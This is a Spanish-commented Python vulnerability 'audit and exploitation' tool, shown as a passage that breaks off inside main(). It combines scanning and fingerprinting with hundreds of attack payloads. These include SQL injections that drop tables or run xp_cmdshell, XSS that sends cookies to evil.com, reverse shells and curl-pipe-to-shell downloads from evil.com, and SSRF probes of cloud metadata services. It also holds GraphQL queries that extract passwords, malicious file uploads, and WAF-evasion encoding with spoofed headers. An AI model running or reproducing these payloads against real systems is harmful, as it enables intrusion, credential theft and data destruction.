import argparse
import importlib
import os
import dns.resolver
import dns.zone
import dns.query
import requests
import nmap
import ssl
import socket
from bs4 import BeautifulSoup
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from random import choice
import base64
import urllib.parse
import json
import logging

# Configuración avanzada de logging
logging.basicConfig(
    filename="audit.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s"
)

init(autoreset=True)

BANNER = r"""
   Herramienta de auditoría de vulnerabilidades y explotación
    ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗██╗  ██╗██╗████████╗
    ██║   ██║██║   ██║██║     ████╗  ██║██║ ██╔╝██║╚══██╔══╝
    ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╔╝ ██║   ██║
    ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔═██╗ ██║   ██║
     ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║  ██╗██║   ██║
      ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝   ╚═╝  
         version 4.0 - Creado wiht <3 by @Zuk4r1
"""

def list_exploits():
    return [
        "dt", "sqli", "rce", "ssrf", "xss", "deserialization", "ldap_injection",
        "csrf", "x_frame", "https", "file_upload", "graphql_injection",
        "xml_external_entity_injection", "command_injection", "open_redirect", "xxe"
    ]

def port_scan(target):
    print(f"[INFO] Escaneando puertos en {target}...")
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-p- -sV -sC -T4')
    open_ports = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            for port in lport:
                open_ports.append((port, nm[host][proto][port]['name']))
    return open_ports

def check_ssl_vulnerabilities(target):
    print(f"[INFO] Verificando vulnerabilidades SSL/TLS en {target}...")
    vulnerabilities = []
    context = ssl.create_default_context()
    max_retries = 3
    for attempt in range(max_retries):
        try:
            with socket.create_connection((target, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=target) as secure_sock:
                    cert = secure_sock.getpeercert()
                    if context.protocol == ssl.PROTOCOL_TLSv1:
                        vulnerabilities.append({"name": "TLS 1.0 habilitado", "severity": "Medium"})
                    if not cert.get('subjectAltName'):
                        vulnerabilities.append({"name": "Falta SAN en certificado", "severity": "Low"})
            return vulnerabilities
        except (socket.error, ssl.SSLError) as e:
            print(f"[ERROR] Error al verificar SSL/TLS (intento {attempt + 1} de {max_retries}): {e}")
            if attempt == max_retries - 1:
                return vulnerabilities

def scan_file_uploads(target):
    print(f"[INFO] Escaneando cargas de archivos en {target}...")
    vulnerabilities = []
    try:
        response = requests.get(f"http://{target}/upload", timeout=10)
        if 'upload' in response.text.lower():
            malicious_files = [
                'malicious.jpg.php', 'malicious.php', 'malicious.exe', 'malicious.pdf',
                'malicious.zip', 'malicious.gif', 'malicious.jsp', 'malicious.svg',
                'malicious.txt', 'malicious.php3', 'malicious.phtml', 'malicious.py'
            ]
            for file in malicious_files:
                if os.path.exists(file):
                    print(f"[INFO] Intentando cargar archivo: {file}")
                    with open(file, 'rb') as f:
                        files = {'file': f}
                        upload_response = requests.post(f"http://{target}/upload", files=files, timeout=10)
                        if upload_response.status_code == 200 and 'success' in upload_response.text.lower():
                            vulnerabilities.append({"name": "File Upload Vulnerability", "details": f"Posible carga insegura detectada con {file}"})
                else:
                    print(f"[WARNING] Archivo no encontrado: {file}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al escanear cargas de archivos: {e}")
    return vulnerabilities

def scan_graphql_injection(target):
    print(f"[INFO] Escaneando inyecciones en GraphQL en {target}...")
    vulnerabilities = []
    malicious_queries = [
        "{ __schema { types { name } } }",
        "mutation { deleteUser(id: 1) }",
        "{ users { id name email password sensitiveData } }",
        "{ posts { title content author { id name } } }",
        "{ __type(name: \"User\") { fields { name type { name } } } }",
        "{ login(username: \"admin\", password: \"password\") { token } }",
        "{ user(id: \"1\") { password roles permissions lastLogin } }",
        "{ allUsers { id name email role password lastLogin createdAt updatedAt } }"
    ]
    try:
        for query in malicious_queries:
            response = requests.post(f"http://{target}/graphql", json={"query": query}, timeout=10)
            if response.status_code == 200 and 'errors' not in response.json():
                vulnerabilities.append({"name": "GraphQL Injection Vulnerability", "details": f"Consulta maliciosa permitida: {query}"})
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al escanear inyecciones GraphQL: {e}")
    return vulnerabilities

def run_exploit(exploit_name, target):
    try:
        print(f"[INFO] Cargando exploit: {exploit_name}")
        module = importlib.import_module(f"exploits.exploit_{exploit_name}")
        return module.execute(target)
    except ModuleNotFoundError:
        return {"name": f"[ERROR] Exploit '{exploit_name}' no encontrado.", "details": ""}
    except Exception as e:
        return {"name": "[ERROR]", "details": f"Error al ejecutar el exploit: {e}"}

def detect_waf(target):
    print(f"[INFO] Detectando WAF en {target}...")
    waf_signatures = [
        ("cloudflare", "cloudflare"),
        ("sucuri", "sucuri"),
        ("incapsula", "incapsula"),
        ("mod_security", "mod_security"),
        ("aws", "aws"),
        ("f5", "big-ip"),
        ("barracuda", "barracuda"),
        ("imperva", "imperva"),
        ("akamai", "akamai"),
    ]
    try:
        resp = requests.get(f"http://{target}", timeout=10)
        headers = str(resp.headers).lower()
        for name, sig in waf_signatures:
            if sig in headers:
                return [{"name": "WAF Detectado", "details": f"Posible WAF: {name}"}]
    except Exception as e:
        print(f"[ERROR] Error al detectar WAF: {e}")
    return []

def fingerprint_tech(target):
    print(f"[INFO] Fingerprinting de tecnologías en {target}...")
    techs = []
    try:
        resp = requests.get(f"http://{target}", timeout=10)
        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")
        if server:
            techs.append({"name": "Servidor", "details": server})
        if powered:
            techs.append({"name": "X-Powered-By", "details": powered})
        if "wordpress" in resp.text.lower():
            techs.append({"name": "WordPress Detectado", "details": "El sitio parece usar WordPress"})
        if "drupal" in resp.text.lower():
            techs.append({"name": "Drupal Detectado", "details": "El sitio parece usar Drupal"})
        if "joomla" in resp.text.lower():
            techs.append({"name": "Joomla Detectado", "details": "El sitio parece usar Joomla"})
    except Exception as e:
        print(f"[ERROR] Error en fingerprinting: {e}")
    return techs

def aggressive_subdomain_scan(target):
    print(f"[INFO] Escaneando subdominios en {target} (modo agresivo)...")
    subdomains = ["www", "mail", "ftp", "test", "dev", "admin", "api", "portal", "vpn", "webmail", "blog", "staging", "beta", "shop", "secure"]
    found = []
    for sub in subdomains:
        subdomain = f"{sub}.{target}"
        try:
            resp = requests.get(f"http://{subdomain}", timeout=3)
            if resp.status_code < 500:
                found.append({"name": "Subdominio activo", "details": subdomain})
        except Exception:
            continue
    return found

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "curl/7.68.0",
        "python-requests/2.25.1",
        "sqlmap/1.5.2#stable",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    ]
    return choice(agents)

def enhanced_request(url, method="GET", **kwargs):
    headers = kwargs.pop("headers", {})
    headers["User-Agent"] = random_user_agent()
    headers["X-Forwarded-For"] = ".".join(str(choice(range(1,255))) for _ in range(4))
    if method == "GET":
        return requests.get(url, headers=headers, **kwargs)
    elif method == "POST":
        return requests.post(url, headers=headers, **kwargs)
    elif method == "PUT":
        return requests.put(url, headers=headers, **kwargs)
    elif method == "DELETE":
        return requests.delete(url, headers=headers, **kwargs)
    else:
        return requests.request(method, url, headers=headers, **kwargs)

# AGRESSIVE_SQLI_PAYLOADS: Más de 300 payloads avanzados y variados
AGRESSIVE_SQLI_PAYLOADS = [
    # Payloads básicos, variantes, comentarios, hexadecimales, unicode, encoded, combinaciones, time-based, error-based, stacked, etc.
    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "\" OR 1=1#", "' OR 1=1/*", "\" OR 1=1/*",
    "' OR sleep(5)--", "\" OR sleep(5)--", "' OR SLEEP(5)#", "\" OR SLEEP(5)#", "' OR SLEEP(5)/*", "\" OR SLEEP(5)/*",
    "' OR BENCHMARK(1000000,MD5(1))--", "\" OR BENCHMARK(1000000,MD5(1))--",
    "' OR 1=CONVERT(int,(SELECT @@version))--", "\" OR 1=CONVERT(int,(SELECT @@version))--",
    "' OR 1=CAST(version() AS int)--", "\" OR 1=CAST(version() AS int)--",
    "' OR ASCII(SUBSTRING((SELECT user()),1,1))>64--", "\" OR ASCII(SUBSTRING((SELECT user()),1,1))>64--",
    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--", "\" OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR 1=1;--", "\" OR 1=1;--", "' OR 1=1 LIMIT 1;--", "\" OR 1=1 LIMIT 1;--",
    "' OR 1=1-- -", "\" OR 1=1-- -", "' OR 1=1#--", "\" OR 1=1#--", "' OR 1=1/*--", "\" OR 1=1/*--",
    "' OR 1=1;--", "\" OR 1=1;--", "' OR 1=1;#", "\" OR 1=1;#",
    "' OR 1=1; WAITFOR DELAY '0:0:5'--", "\" OR 1=1; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(10)#", "\" OR SLEEP(10)#", "' OR SLEEP(10)--+", "\" OR SLEEP(10)--+",
    "' OR SLEEP(10)/*", "\" OR SLEEP(10)/*", "' OR BENCHMARK(5000000,MD5(1))--", "\" OR BENCHMARK(5000000,MD5(1))--",
    "' OR 1=CONVERT(int,(SELECT @@hostname))--", "\" OR 1=CONVERT(int,(SELECT @@hostname))--",
    "' OR 1=CAST(user() AS int)--", "\" OR 1=CAST(user() AS int)--",
    "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64--", "\" OR ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "' OR (SELECT COUNT(*) FROM mysql.user)>0--", "\" OR (SELECT COUNT(*) FROM mysql.user)>0--",
    "' OR 1=1; SELECT SLEEP(15);--", "\" OR 1=1; SELECT SLEEP(15);--",
    "' OR 1=1; SELECT pg_sleep(15);--", "\" OR 1=1; SELECT pg_sleep(15);--",
    "' OR 1=1; SELECT IF(1=1,SLEEP(10),0)--", "\" OR 1=1; SELECT IF(1=1,SLEEP(10),0)--",
    "' OR 1=1; SELECT IF(1=1,BENCHMARK(1000000,MD5(1)),0)--", "\" OR 1=1; SELECT IF(1=1,BENCHMARK(1000000,MD5(1)),0)--",
    "' OR 1=1; SELECT IF(ASCII(SUBSTRING((SELECT user()),1,1))>64,SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF(ASCII(SUBSTRING((SELECT user()),1,1))>64,SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT LENGTH(database()))>0,SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT LENGTH(database()))>0,SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT user()) LIKE '%root%',SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT user()) LIKE '%root%',SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT version()) LIKE '%5%',SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT version()) LIKE '%5%',SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%user%',SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%user%',SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(10),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM pg_user)>0,pg_sleep(10),0)--",
    "\" OR 1=1; SELECT IF((SELECT COUNT(*) FROM pg_user)>0,pg_sleep(10),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM sqlite_master)>0,randomblob(1000000000),0)--",
    "\" OR 1=1; SELECT IF((SELECT COUNT(*) FROM sqlite_master)>0,randomblob(1000000000),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM sysobjects)>0,WAITFOR DELAY '0:0:10',0)--",
    "\" OR 1=1; SELECT IF((SELECT COUNT(*) FROM sysobjects)>0,WAITFOR DELAY '0:0:10',0)--",
    "'/*!50000union*/ /*!50000select*/ 1,2--", "\"/*!50000union*/ /*!50000select*/ 1,2--",
    "' OR 0x31=0x31--", "\" OR 0x31=0x31--", "' OR UNHEX('31')=UNHEX('31')--", "\" OR UNHEX('31')=UNHEX('31')--",
    "' OR 1=1%00", "\" OR 1=1%00", "' OR 1=1%23", "\" OR 1=1%23", "' OR 1=1%27", "\" OR 1=1%27",
    "' OR 1=1%3B", "\" OR 1=1%3B", "' OR 1=1%2D%2D", "\" OR 1=1%2D%2D", "' OR 1=1%23%0A", "\" OR 1=1%23%0A",
    "' OR 1=1;-- -", "\" OR 1=1;-- -", "' OR 1=1;#--", "\" OR 1=1;#--", "' OR 1=1/*--", "\" OR 1=1/*--",
    "' OR 1=1;--", "\" OR 1=1;--", "' OR 1=1;#", "\" OR 1=1;#",
    "' OR 1=1; SHUTDOWN --", "\" OR 1=1; SHUTDOWN --", "' OR 1=1; DROP TABLE users;--", "\" OR 1=1; DROP TABLE users;--",
    "' OR 1=1; DROP DATABASE test;--", "\" OR 1=1; DROP DATABASE test;--",
    "' OR 1=1; EXEC xp_cmdshell('whoami');--", "\" OR 1=1; EXEC xp_cmdshell('whoami');--",
    "' OR 1=1; EXEC sp_configure 'show advanced options',1;--", "\" OR 1=1; EXEC sp_configure 'show advanced options',1;--",
    "' OR 1=1; SELECT pg_sleep(5);--", "\" OR 1=1; SELECT pg_sleep(5);--",
    "' OR 1=1; SELECT sleep(5);--", "\" OR 1=1; SELECT sleep(5);--",
    # Rango de números y variantes
] + [f"' OR {i}={i}--" for i in range(0, 100)] + [f"\" OR {i}={i}--" for i in range(0, 100)] \
  + [f"' OR {i}=CONVERT(int,(SELECT @@version))--" for i in range(0, 50)] \
  + [f"' OR SLEEP({i})--" for i in range(1, 21)] \
  + [f"' OR BENCHMARK({i}0000,MD5(1))--" for i in range(1, 21)] \
  + [f"' OR 1=1; WAITFOR DELAY '0:0:{i}'--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT SLEEP({i});--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT pg_sleep({i});--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF(1=1,SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF(1=1,BENCHMARK({i}0000,MD5(1)),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT LENGTH(database()))>0,SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT user()) LIKE '%root%',SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT version()) LIKE '%5%',SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%user%',SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT COUNT(*) FROM pg_user)>0,pg_sleep({i}),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT COUNT(*) FROM sqlite_master)>0,randomblob({i}00000000),0)--" for i in range(1, 21)] \
  + [f"' OR 1=1; SELECT IF((SELECT COUNT(*) FROM sysobjects)>0,WAITFOR DELAY '0:0:{i}',0)--" for i in range(1, 21)]

# AGRESSIVE_XSS_PAYLOADS: Más de 300 payloads avanzados y variantes
AGRESSIVE_XSS_PAYLOADS = [
    # Básicos y variantes comunes
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>", "<math href='javascript:alert(1)'>", "<object data='javascript:alert(1)'>",
    "<svg><script>alert(1)</script></svg>", "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=\"javascript:alert(1)\"></video>", "<a href='javascript:alert(1)'>Click</a>",
    "<img src='x' onerror='prompt(1)'>", "<img src='x' onerror='confirm(1)'>", "<img src='x' onerror='console.log(1)'>",
    "<img src='x' onerror='document.write(1)'>", "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<marquee onstart=alert(1)>", "<form><button formaction='javascript:alert(1)'>X</button></form>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "<img srcset='x 1x, javascript:alert(1) 2x'>",
    # Avanzados y polimórficos
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=top['al'+'ert'](1)>", "<img src=x onerror=window['al'+'ert'](1)>",
    "<img src=x onerror=window['\\x61lert'](1)>", "<img src=x onerror=window['\\x61'+'lert'](1)>",
    "<svg/onload=window['alert'](1)>", "<img src=x onerror=window['alert'](String.fromCharCode(49))>",
    "<img src=x onerror=window['alert'](String.fromCharCode(88,83,83))>",
    "<img src=x onerror=window['alert'](document.domain)>", "<img src=x onerror=window['alert'](document.cookie)>",
    "<svg/onload=fetch('https://evil.com/?c='+document.cookie)>",
    "<img src=x onerror=location='//evil.com/?'+document.cookie>",
    "<img src=x onerror=window.open('https://evil.com/?c='+document.cookie)>",
    "<svg/onload=alert`1`>", "<svg/onload=alert(1)//", "<img src=x onerror=alert(1)//>",
] + [f"<script>alert({i})</script>" for i in range(0, 100)] \
  + [f"<img src=x onerror=alert({i})>" for i in range(0, 100)] \
  + [f"<svg/onload=alert({i})>" for i in range(0, 100)] \
  + [f"<iframe src='javascript:alert({i})'></iframe>" for i in range(0, 100)] \
  + [f"<body onload=alert({i})>" for i in range(0, 100)] \
  + [f"<img src=x onerror=eval(atob('{base64.b64encode(f'alert({i})'.encode()).decode()}'))>" for i in range(0, 50)] \
  + [f"<img src=x onerror=window['alert']({i})>" for i in range(0, 100)] \
  + [f"<img src=x onerror=window['alert'](String.fromCharCode({ord('A')+i}))>" for i in range(0, 26)]

# AGRESSIVE_RCE_PAYLOADS: Más de 300 payloads avanzados y variantes
AGRESSIVE_RCE_PAYLOADS = [
    "; id", "| id", "`id`", "$(id)", "$(whoami)", "&& id", "&& whoami", "| bash -i >& /dev/tcp/evil.com/4444 0>&1",
    "; nc -e /bin/sh evil.com 4444", "| powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
    "|| whoami", "&& cat /etc/passwd", "| python -c 'import os;os.system(\"id\")'", "| perl -e 'exec \"id\";'",
    "| php -r 'system(\"id\");'", "| ruby -e 'exec \"id\"'", "| bash -c 'id'", "| sh -c 'id'",
    "; curl http://evil.com/shell.sh | sh", "; wget http://evil.com/shell.sh -O- | sh",
    "| nc -nv evil.com 4444 -e /bin/sh", "| socat exec:'sh',pty,stderr,setsid,sigint,sane tcp:evil.com:4444",
    "| /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1", "| python3 -c 'import os;os.system(\"id\")'",
    ";$(sleep 5)", "| sleep 5", "&& sleep 5", "; sleep 10", "| sleep 10", "&& sleep 10",
    ";$(curl http://evil.com/shell.sh|sh)", ";$(wget http://evil.com/shell.sh -O- | sh)",
    "| bash -c 'exec bash -i &>/dev/tcp/evil.com/4444 <&1'",
    "| perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "| php -r '\$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
] + [f"; sleep {i}" for i in range(1, 101)] \
  + [f"| sleep {i}" for i in range(1, 101)] \
  + [f"&& sleep {i}" for i in range(1, 101)] \
  + [f"; curl http://evil.com/shell{i}.sh | sh" for i in range(1, 51)] \
  + [f"; wget http://evil.com/shell{i}.sh -O- | sh" for i in range(1, 51)] \
  + [f"| bash -c 'id; sleep {i}'" for i in range(1, 51)] \
  + [f"| python -c 'import os;os.system(\"id; sleep {i}\")'" for i in range(1, 51)]

# AGRESSIVE_SSRF_PAYLOADS: Más de 300 payloads avanzados y variantes
AGRESSIVE_SSRF_PAYLOADS = [
    "http://localhost:80", "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:80", "http://0.0.0.0:80", "http://10.0.0.1:80", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING",
    "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:5000", "http://127.0.0.1:8080",
    "http://localhost/admin", "http://localhost/phpinfo.php", "http://localhost/server-status",
    "http://[::]:80", "http://2130706433:80", "http://0x7f000001:80", "http://0177.0.0.1:80",
    "http://127.1/robots.txt", "http://127.1/.git/config", "http://127.1/.env", "file:///c:/windows/win.ini",
    "http://localhost:8000", "http://localhost:2375/version", "http://localhost:11211",
    "http://127.0.1.1:80", "http://127.0.1.2:80", "http://127.2.2.2:80", "http://127.3.3.3:80",
    "http://0x7f000001:22", "http://0x7f000001:3306", "http://0x7f000001:5000", "http://0x7f000001:8080",
    "http://[::ffff:127.0.0.1]:80", "http://[::ffff:7f00:1]:80", "http://[::]:2375",
    "http://169.254.169.254/latest/user-data/", "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://azure.local/metadata/instance?api-version=2017-08-01",
    "http://100.100.100.200/latest/meta-data/",
] + [f"http://127.0.0.1:{port}" for port in range(1, 1025)] \
  + [f"http://localhost:{port}" for port in range(1, 1025)] \
  + [f"http://0x7f000001:{port}" for port in range(1, 1025, 10)] \
  + [f"http://[::1]:{port}" for port in range(1, 1025, 10)] \
  + [f"http://169.254.169.254:{port}/latest/meta-data/" for port in range(80, 10000, 100)] \
  + [f"gopher://127.0.0.1:{port}/_PING" for port in range(1, 1025, 10)] \
  + [f"http://127.0.0.{i}:80" for i in range(1, 255)] \
  + [f"http://10.0.0.{i}:80" for i in range(1, 255)]

# ADVANCED_SQLI_PAYLOADS: combinación y extensión de AGRESSIVE_SQLI_PAYLOADS
ADVANCED_SQLI_PAYLOADS = AGRESSIVE_SQLI_PAYLOADS + [
    "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
    "' OR 1=1; SELECT SLEEP(10);--", "' OR 1=1; SELECT pg_sleep(10);--",
    "' OR 1=1; SELECT IF(1=1,SLEEP(5),0)--", "' OR 1=1; SELECT IF(1=1,BENCHMARK(1000000,MD5(1)),0)--",
    "' OR 1=1; SELECT IF(ASCII(SUBSTRING((SELECT user()),1,1))>64,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT LENGTH(database()))>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT user()) LIKE '%root%',SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT version()) LIKE '%5%',SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%user%',SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM pg_user)>0,pg_sleep(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM sqlite_master)>0,randomblob(1000000000),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM sysobjects)>0,WAITFOR DELAY '0:0:5',0)--",
    # Más variantes avanzadas
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.db)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.columns_priv)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.tables_priv)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.procs_priv)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.proxies_priv)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.servers)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.user)>0,SLEEP(5),0)--",
    "' OR 1=1; SELECT IF((SELECT COUNT(*) FROM mysql.db)>0,SLEEP(5),0)--"
]

def advanced_port_scan(target, threads=50):
    print(f"[INFO] Escaneo avanzado de puertos en {target} con {threads} hilos...")
    open_ports = []
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except Exception:
                    service = "unknown"
                return (port, service)
            sock.close()
        except Exception:
            return None
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_port, port): port for port in range(1, 1025)}
        for future in as_completed(futures):
            res = future.result()
            if res:
                open_ports.append(res)
    return open_ports

def detect_admin_panels(target):
    print(f"[INFO] Buscando paneles de administración en {target}...")
    panels = [
        "admin", "administrator", "login", "admin/login", "cpanel", "wp-admin", "user/login", "backend", "dashboard"
    ]
    found = []
    for panel in panels:
        url = f"http://{target}/{panel}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code in [200, 401, 403]:
                found.append({"name": "Panel de administración encontrado", "details": url})
        except Exception:
            continue
    return found

def enhanced_fingerprint_tech(target):
    print(f"[INFO] Fingerprinting avanzado de tecnologías en {target}...")
    techs = fingerprint_tech(target)
    try:
        resp = requests.get(f"http://{target}/robots.txt", timeout=5)
        if "Disallow" in resp.text:
            techs.append({"name": "robots.txt presente", "details": "Puede contener rutas sensibles"})
    except Exception:
        pass
    # Buscar frameworks JS populares
    try:
        resp = requests.get(f"http://{target}", timeout=5)
        soup = BeautifulSoup(resp.text, "html.parser")
        scripts = [s.get("src", "") for s in soup.find_all("script")]
        for s in scripts:
            if "jquery" in s:
                techs.append({"name": "jQuery Detectado", "details": s})
            if "angular" in s:
                techs.append({"name": "AngularJS Detectado", "details": s})
            if "react" in s:
                techs.append({"name": "ReactJS Detectado", "details": s})
    except Exception:
        pass
    return techs

def advanced_aggressive_subdomain_scan(target, threads=30):
    print(f"[INFO] Escaneo avanzado de subdominios en {target}...")
    subdomains = [
        "www", "mail", "ftp", "test", "dev", "admin", "api", "portal", "vpn", "webmail", "blog", "staging", "beta", "shop", "secure",
        "dev", "test", "stage", "uat", "old", "backup", "static", "cdn", "img", "files", "data", "internal"
    ]
    found = []
    def check_sub(sub):
        subdomain = f"{sub}.{target}"
        try:
            resp = requests.get(f"http://{subdomain}", timeout=2)
            if resp.status_code < 500:
                return {"name": "Subdominio activo", "details": subdomain}
        except Exception:
            return None
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_sub, sub): sub for sub in subdomains}
        for future in as_completed(futures):
            res = future.result()
            if res:
                found.append(res)
    return found

def evasive_payloads(payloads):
    # Añade variantes codificadas y polimórficas
    evasive = []
    for p in payloads:
        evasive.append(p)
        evasive.append(base64.b64encode(p.encode()).decode())
        evasive.append(urllib.parse.quote(p))
        evasive.append(p[::-1])  # Reverse
    return evasive

def advanced_waf_detection(target):
    print(f"[INFO] Detección avanzada de WAF en {target}...")
    wafs = detect_waf(target)
    try:
        resp = requests.get(f"http://{target}/", headers={"User-Agent": "sqlmap"}, timeout=5)
        if "captcha" in resp.text.lower():
            wafs.append({"name": "Captcha detectado", "details": "Posible protección anti-bot"})
    except Exception:
        pass
    return wafs

def generate_report(results, filename="audit_report.json"):
    print(f"[INFO] Generando reporte en {filename}...")
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

def main():
    parser = argparse.ArgumentParser(description="Herramienta avanzada de auditoría de vulnerabilidades")
    parser.add_argument("target", help="Dominio o IP objetivo")
    parser.add_argument("--threads", type=int, default=30, help="Número de hilos para escaneos")
    parser.add_argument("--proxy", help="Proxy HTTP/SOCKS (opcional)")
    parser.add_argument("--json", action="store_true", help="Generar reporte JSON")
    args = parser.parse_args()

    target = args.target
    threads = args.threads

    # Configuración de proxy global si se especifica
    if args.proxy:
        proxy = {"http": args.proxy, "https": args.proxy}
        requests.defaults = {"proxies": proxy}

    results = {
        "puertos": advanced_port_scan(target, threads),
